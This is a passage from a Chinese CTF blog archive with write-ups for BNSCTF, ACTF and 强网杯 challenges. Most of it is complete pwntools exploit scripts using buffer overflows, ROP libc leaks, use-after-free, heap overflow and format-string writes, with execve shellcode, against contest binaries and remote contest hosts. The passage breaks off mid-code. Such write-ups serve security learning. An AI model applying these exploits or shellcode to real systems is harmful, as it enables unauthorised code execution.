class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include<iostream></iostream></span><br><span class="line">#include<stdio.h></stdio.h></span><br><span class="line">char key[] = "flag!iS_not&here,getit";</span><br><span class="line">char crypto[] = { 36,47,47,52,90,32,12,107,3,48,21,121,26,86,19,41,115,33,9,53,14,9 };</span><br><span class="line">int main() {</span><br><span class="line">for (int i = 0; i < 22; i++) {</span><br><span class="line">printf("%c", key[i] ^ crypto[i]);</span><br><span class="line">}</span><br><span class="line">return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><h2 id="BCNS-I-4m-a-r3aL-FlAg"><a href="#BCNS-I-4m-a-r3aL-FlAg" class="headerlink" title="BCNS{I_4m_a_r3aL_FlAg}"></a>BCNS{I_4m_a_r3aL_FlAg}</h2><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="0x01-签退题love-pyc"><a href="#0x01-签退题love-pyc" class="headerlink" title="0x01 签退题love.pyc"></a>0x01 签退题<a href="love.pyc">love.pyc</a></h3><p>这是一题Pyc隐写题，一开始没有发觉，直接Pyc转Py了，然后愣了半天<br>可以使用stegosaurus.py</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python stegosaurus.py xxx.pyc -x    //这样就可以输出隐写的数据</span><br></pre></td></tr></tbody></table></figure></div><p><a href="/2019/06/09/CTF-2019%E5%B9%B46%E6%9C%88BNSCTF/2.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/06/09/CTF-2019%E5%B9%B46%E6%9C%88BNSCTF/2.png" class="lazyload"></a></p><h2 id="BCNS-H3lL0-Nic3-t0-m33t-y0U"><a href="#BCNS-H3lL0-Nic3-t0-m33t-y0U" class="headerlink" title="BCNS{H3lL0_Nic3_t0_m33t_y0U!}"></a>BCNS{H3lL0_Nic3_t0_m33t_y0U!}</h2><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="0x01-签到题check-in"><a href="#0x01-签到题check-in" class="headerlink" title="0x01 签到题check_in"></a>0x01 签到题<a href="check_in">check_in</a></h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh = process("./check_in")</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">sh = remote(<span class="string">"47.107.60.13"</span>,<span class="number">10000</span>)</span><br><span class="line">elf = ELF(<span class="string">"check_in"</span>)</span><br><span class="line">sh.send(<span class="string">"b"</span>*<span class="number">0x18</span> + p64(<span class="number">0x7FFFFFFFFFFFFFFF</span>)+p64(<span class="number">0x3fb999999999999a</span>))</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">"cat flag"</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div><h3 id="0x02-签退题check-out"><a href="#0x02-签退题check-out" class="headerlink" title="0x02 签退题check_out"></a>0x02 签退题<a href="check_out">check_out</a></h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">#sh = process("./check_out")</span><br><span class="line">sh = remote("47.107.60.13",10001)</span><br><span class="line">shell_addr = 0x0804863A</span><br><span class="line">sh.sendline('a'*112+p32(shell_addr))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div><h3 id="0x03-check-ing-blindpwn"><a href="#0x03-check-ing-blindpwn" class="headerlink" title="0x03 check_ing[blindpwn]"></a>0x03 check_ing[blindpwn]</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#sh = process("./blindpwn")</span><br><span class="line">#nc 47.107.60.13:10002</span><br><span class="line">sh = remote("47.107.60.13",10002)</span><br><span class="line">elf = ELF("blindpwn")</span><br><span class="line">offset = 40</span><br><span class="line">pop_rdi_ret = 0x0000000000400783</span><br><span class="line">pop_rsi_r15_ret = 0x0000000000400781</span><br><span class="line">payload = 'a'*offset + p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(elf.got['__libc_start_main']) + p64(0) +  p64(elf.symbols['write']) + p64(elf.symbols['main'])</span><br><span class="line">sh.recvuntil("Welcome to this blind pwn!\n")</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">libc = u64(sh.recv(8))</span><br><span class="line">log.success(hex(libc))</span><br><span class="line">system_addr = libc + 0x24c50</span><br><span class="line">binsh_addr = libc + 0x16c617</span><br><span class="line">payload = 'a' * offset + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-ACTF-19年5月</title>
      <link href="/2019/06/03/CTF-ACTF-19%E5%B9%B45%E6%9C%88/"/>
      <url>/2019/06/03/CTF-ACTF-19%E5%B9%B45%E6%9C%88/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="0x01-babyheap"><a href="#0x01-babyheap" class="headerlink" title="0x01  babyheap"></a>0x01  babyheap</h3><p><a href="babyheap.rar">文件下载 babyheap</a><br>导入IDA分析，发现UAF漏洞，只需要覆盖函数指针为system即可，然后F12发现”/bin/sh”，所以可以直接传参到system函数，直接拿到shell<br>附上exploit.py</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">sh = process("./babyheap")</span><br><span class="line">elf = ELF("babyheap")</span><br><span class="line">def add(s):</span><br><span class="line">sh.recvuntil("Your choice: ");</span><br><span class="line">sh.sendline("1")</span><br><span class="line">sh.recvuntil("Please input size:")</span><br><span class="line">sh.sendline(str(len(s)))</span><br><span class="line">sh.recvuntil("Please input content:")</span><br><span class="line">sh.send(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">sh.recvuntil("Your choice: ")</span><br><span class="line">sh.sendline("2")</span><br><span class="line">sh.recvuntil("Please input list index: ")</span><br><span class="line">sh.sendline(index)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">        sh.recvuntil("Your choice: ");</span><br><span class="line">        sh.sendline("3")</span><br><span class="line">sh.recvuntil("Please input list index:")</span><br><span class="line">sh.sendline(index)</span><br><span class="line">add('a'*32)</span><br><span class="line">add('a'*32)</span><br><span class="line">delete("0")</span><br><span class="line">delete("1")</span><br><span class="line">add(p64(0x0000000000602010)+p64(elf.plt['system']))</span><br><span class="line">show("0")</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div><h3 id="0x02-AnotherRepeater"><a href="#0x02-AnotherRepeater" class="headerlink" title="0x02 AnotherRepeater"></a>0x02 AnotherRepeater</h3><p><a href="AnotherRepeater.rar">文件下载 AnotherRepeater</a><br>附上exploit.py</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">sh = remote("140.82.19.20",37621)</span><br><span class="line">#sh = process("./AnotherRepeater")</span><br><span class="line">elf = ELF("AnotherRepeater")</span><br><span class="line">sh.recvuntil("Be careful. How many chars you want to reapeat?")</span><br><span class="line">sh.sendline("-1")</span><br><span class="line">sh.recv()</span><br><span class="line">stack_addr = int(sh.recv(8),16)</span><br><span class="line">offset = 1055</span><br><span class="line">payload = "\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xb0\x0b\xcd\x80"</span><br><span class="line">payload = payload.ljust(offset,'a')</span><br><span class="line">payload = payload + p32(stack_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div><h3 id="0x03-babystack"><a href="#0x03-babystack" class="headerlink" title="0x03 babystack"></a>0x03 babystack</h3><p><a href="babystack.rar">文件下载 babystack</a><br>附上exploit.py</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from time import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">sh = process("./babystack")</span><br><span class="line">elf = ELF("babystack")</span><br><span class="line">pop_rdi_ret = 0x0000000000400ad3</span><br><span class="line">pop_rsi_r15_ret = 0x0000000000400ad1</span><br><span class="line">leave_ret = 0x0000000000400a18</span><br><span class="line">sh.recv()</span><br><span class="line">sleep(3)</span><br><span class="line">sh.recvuntil(">")</span><br><span class="line">sh.sendline("224")</span><br><span class="line">sh.recvuntil("Your message will be saved at 0x")</span><br><span class="line">stack_addr = int(sh.recv(12),16)</span><br><span class="line">print stack_addr</span><br><span class="line">payload = 'a'*8 + p64(pop_rdi_ret) + p64(elf.got['__libc_start_main']) + p64(elf.plt['puts'])</span><br><span class="line">payload += p64(0x0000000000400800)</span><br><span class="line">payload = payload.ljust(208,'a') + p64(stack_addr) + p64(leave_ret)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil("bye~\n",True)</span><br><span class="line">libc_addr = u64(sh.recv(6)+"\x00\x00")</span><br><span class="line">log.success("__libc_start_main value = " + hex(libc_addr))</span><br><span class="line">sh.recv()</span><br><span class="line">sleep(3)</span><br><span class="line">sh.recvuntil(">")</span><br><span class="line">sh.sendline("224")</span><br><span class="line">sh.recvuntil("Your message will be saved at 0x")</span><br><span class="line">stack_addr = int(sh.recv(12),16)</span><br><span class="line">payload = 'a'*8 + p64(pop_rdi_ret) + p64(libc_addr+0x1923ea) + p64(libc_addr+0x2d990+0x1B)</span><br><span class="line">payload = payload.ljust(208,'a') + p64(stack_addr) + p64(leave_ret)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div><h3 id="0x04-OneRepeater"><a href="#0x04-OneRepeater" class="headerlink" title="0x04 OneRepeater"></a>0x04 OneRepeater</h3><p><a href="OneRepeater.rar">文件下载 OneRepeater</a><br>附上exploit.py</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">sh = remote("140.82.19.20",36427)</span><br><span class="line">#sh = process("./OneRepeater")</span><br><span class="line">elf = ELF("OneRepeater")</span><br><span class="line">sh.recvuntil("What you want to do?\n1) Input someing exciting to repeat!\n2) repeating!!!\n3) Exit\n")</span><br><span class="line">sh.sendline("1")</span><br><span class="line">data = int(sh.recv(8),16)</span><br><span class="line">payload = p32(data+0x40C+0x4*4) +"%." +str((data % 0x10000)+0x100-5) +"d%16$hn"</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil("3) Exit\n")</span><br><span class="line">sh.sendline("2")</span><br><span class="line">sh.sendline("1")</span><br><span class="line">sh.recvuntil("3) Exit\n")</span><br><span class="line">payload = p32(data+0x40C+0x4*4+2) +"%." +str((data >> 16) - 5) +"d%16$hn"</span><br><span class="line">payload = payload.ljust(0x100,"a") + "\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xb0\x0b\xcd\x80"</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline("2")</span><br><span class="line">sh.recvuntil("Exit\n")</span><br><span class="line">sh.sendline("3")</span><br><span class="line">log.success("buf_addr = "+hex(data))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-强网杯-19年6月</title>
      <link href="/2019/06/03/CTF-%E5%BC%BA%E7%BD%91%E6%9D%AF-19%E5%B9%B46%E6%9C%88/"/>
      <url>/2019/06/03/CTF-%E5%BC%BA%E7%BD%91%E6%9D%AF-19%E5%B9%B46%E6%9C%88/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="0x01-强网先锋AP"><a href="#0x01-强网先锋AP" class="headerlink" title="0x01 强网先锋AP"></a>0x01 强网先锋AP</h3><p><a href="main">文件下载 main</a><br>先用checksec检测一下<br><a href="/2019/06/03/CTF-%E5%BC%BA%E7%BD%91%E6%9D%AF-19%E5%B9%B46%E6%9C%88/1.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/06/03/CTF-%E5%BC%BA%E7%BD%91%E6%9D%AF-19%E5%B9%B46%E6%9C%88/1.png" class="lazyload"></a><br>发现保护全开，所以不可以覆盖got表来实现跳转<br>用IDA分析main，发现没有free，所以不能使用unlink、double free等<br>在Change函数发现可以无限写漏洞，所以这一题是典型的堆溢出<br>然后再分析一下struct，如下</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">struct note{</span><br><span class="line">char * context;</span><br><span class="line">void * puts_addr;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><p>溢出思路：我们只需要覆盖puts_addr为system函数，然后context修改为”/bin/sh”所在的地址,然后show一下就可以执行system(“/bin/sh”)了<br>但是我们首先需要知道libc的地址，然后推算出system函数的位置。<br>一、进行堆溢出，将fastbin溢出到PREV_INUSE<br>我们只需要写入40个’a’即可覆盖到PREV_INUSE的bk位置，bk位置恰好是__IO_puts，然后show一次就可以拿到libc了。<br><a href="/2019/06/03/CTF-%E5%BC%BA%E7%BD%91%E6%9D%AF-19%E5%B9%B46%E6%9C%88/2.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/06/03/CTF-%E5%BC%BA%E7%BD%91%E6%9D%AF-19%E5%B9%B46%E6%9C%88/2.png" class="lazyload"></a><br>然后查询偏移拿到libc<br><a href="/2019/06/03/CTF-%E5%BC%BA%E7%BD%91%E6%9D%AF-19%E5%B9%B46%E6%9C%88/3.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/06/03/CTF-%E5%BC%BA%E7%BD%91%E6%9D%AF-19%E5%B9%B46%E6%9C%88/3.png" class="lazyload"></a></p><p>二、最后我想办法覆盖puts函数和puts函数对应的指针，我们依旧可以考虑溢出第一个chunk到第二个chunk，然后show第二个chunk的数据，就可以拿到system(“/bin/sh”)了<br>附上exploit.py</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">sh = process("./main")</span><br><span class="line">#sh = remote("117.78.37.77",30071)</span><br><span class="line">elf = ELF("main")</span><br><span class="line">def add(size,context):</span><br><span class="line">sh.recvuntil("Choice >>")</span><br><span class="line">sh.sendline("1")</span><br><span class="line">sh.recvuntil("The length of my owner's name:")</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line">sh.recvuntil("Give me my owner's name:")</span><br><span class="line">sh.send(context)</span><br><span class="line">def show(index):</span><br><span class="line">sh.recvuntil("Choice >>")</span><br><span class="line">sh.sendline("2")</span><br><span class="line">sh.recvuntil("Please tell me which tickets would you want to open?")</span><br><span class="line">sh.sendline(index)</span><br><span class="line">def edit(index,size,context):</span><br><span class="line">sh.recvuntil("Choice >>")</span><br><span class="line">sh.sendline("3")</span><br><span class="line">sh.recvuntil("nt to change it's owner's name?")</span><br><span class="line">sh.sendline(index)</span><br><span class="line">sh.recvuntil("The length of my owner's name:")</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line">sh.recvuntil("Give me my owner's name:")</span><br><span class="line">sh.send(context)</span><br><span class="line">add(8,"a"*7)</span><br><span class="line">add(8,'b'*7)</span><br><span class="line">add(8,'c'*7)</span><br><span class="line">add(8,'d'*7)</span><br><span class="line">edit("0",60,'a'*40)</span><br><span class="line">show("0")</span><br><span class="line">sh.recvuntil("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")</span><br><span class="line">puts_got = u64(sh.recv(6)+"\x00\x00")</span><br><span class="line">print "puts_got = " + hex(puts_got)</span><br><span class="line">edit("0",1000, 'a'*8+'b'*8+'c'*8+'d'*8+p64(puts_got-0x2a300+</span><br><span class="line">0x1479c7)+p64(puts_got-0x2a300)*2+'e'*8+'f'*8+p64(puts_got-0x2a300+</span><br><span class="line">0x1479c7)*7)</span><br><span class="line">show("1")</span><br><span class="line">print "!! "+hex(puts_got-0x2a300+</span><br><span class="line">0x1479c7)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div><p>运行结果:<br><a href="/2019/06/03/CTF-%E5%BC%BA%E7%BD%91%E6%9D%AF-19%E5%B9%B46%E6%9C%88/4.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/06/03/CTF-%E5%BC%BA%E7%BD%91%E6%9D%AF-19%E5%B9%B46%E6%9C%88/4.png" class="lazyload"></a><br>拿到shell了</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p><a href="瞅啥.rar">文件下载 瞅啥.rar</a><br>安装zsteg，然后输入zsteg 图片名<br><a href="/2019/06/03/CTF-%E5%BC%BA%E7%BD%91%E6%9D%AF-19%E5%B9%B46%E6%9C%88/6.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/06/03/CTF-%E5%BC%BA%E7%BD%91%E6%9D%AF-19%E5%B9%B46%E6%9C%88/6.png" class="lazyload"></a><br>直接拿到flag</p><h3 id="qwxf-you-say-chick-beautiful"><a href="#qwxf-you-say-chick-beautiful" class="headerlink" title="qwxf{you_say_chick_beautiful?}"></a>qwxf{you_say_chick_beautiful?}</h3></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Pwn-ElectricalSystem</title>
      <link href="/2019/05/08/CTF-Pwn-ElectricalSystem/"/>
      <url>/2019/05/08/CTF-Pwn-ElectricalSystem/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="首先申明！！！！！！！该题有十分简单的解法，但是我为了提升自己的技术，所以选择用麻烦的做法来实现"><a href="#首先申明！！！！！！！该题有十分简单的解法，但是我为了提升自己的技术，所以选择用麻烦的做法来实现" class="headerlink" title="首先申明！！！！！！！该题有十分简单的解法，但是我为了提升自己的技术，所以选择用麻烦的做法来实现"></a>首先申明！！！！！！！该题有十分简单的解法，但是我为了提升自己的技术，所以选择用麻烦的做法来实现</h1><p>文件下载<a href="CTF-Pwn-ElectricalSystem.rar">CTF-Pwn-ElectricalSystem.rar</a></p><h3 id="这个是朋友拖我做的，貌似是某企业内部CTF比赛吧"><a href="#这个是朋友拖我做的，貌似是某企业内部CTF比赛吧" class="headerlink" title="这个是朋友拖我做的，貌似是某企业内部CTF比赛吧"></a>这个是朋友拖我做的，貌似是某企业内部CTF比赛吧</h3><p>我们先看看这个程序的代码结构，导入IDA分析<br><a href="/2019/05/08/CTF-Pwn-ElectricalSystem/1.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/05/08/CTF-Pwn-ElectricalSystem/1.png" class="lazyload"></a></p><p>我们先看看sub_400986();</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">int sub_400986()</span><br><span class="line">{</span><br><span class="line">  char s[4100]; // [rsp+0h] [rbp-1010h]</span><br><span class="line">  int v2; // [rsp+1004h] [rbp-Ch]</span><br><span class="line">  FILE *stream; // [rsp+1008h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  stream = fopen("logo", "r");</span><br><span class="line">  if ( !stream )</span><br><span class="line">  {</span><br><span class="line">    puts("fail to read");</span><br><span class="line">    exit(1);</span><br><span class="line">  }</span><br><span class="line">  while ( fgets(s, 4096, stream) )</span><br><span class="line">  {</span><br><span class="line">    v2 = strlen(s);</span><br><span class="line">    s[v2 - 1] = 0;</span><br><span class="line">    printf("\x1B[32m%s\x1B[1m\n", s);</span><br><span class="line">  }</span><br><span class="line">  fclose(stream);</span><br><span class="line">  puts("This is a Electrical system");</span><br><span class="line">  return puts("Welcome, Can I help you?\n");</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><p>它的意思是先读取logo文件，然后写在控制台上，没有发现溢出点</p><p>但是接着我们就看到数据被放到bss段，我们选择可以存放ROP在上面</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)</span><br><span class="line">{</span><br><span class="line">  unsigned int v3; // eax</span><br><span class="line">  char v4; // [rsp+0h] [rbp-10h]</span><br><span class="line">  int i; // [rsp+Ch] [rbp-4h]</span><br><span class="line">  v3 = time(0LL);</span><br><span class="line">  srand(v3);</span><br><span class="line">  dword_602160 = rand() % 100;</span><br><span class="line">  dword_602164 = 12 * dword_602160;</span><br><span class="line">  mprotect((void *)0x601000, 0x1500uLL, 7);</span><br><span class="line">  setvbuf(stdout, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(stdin, 0LL, 1, 0LL);</span><br><span class="line">  sub_400986();</span><br><span class="line">  puts("Please enter your electric card 's ID:");</span><br><span class="line">  read(0, &unk_6020E0, 0x50uLL); //这里是将读入的数据写到bss段</span><br><span class="line">  for ( i = 0; i <= 4; ++i )</span><br><span class="line">  {</span><br><span class="line">    printf("\x1B[0;;31m.\x1B[0m");</span><br><span class="line">    sleep(1u);</span><br><span class="line">  }</span><br><span class="line">  while ( 1 )</span><br><span class="line">    sub_400AEE((__int64)&v4);</span><br><span 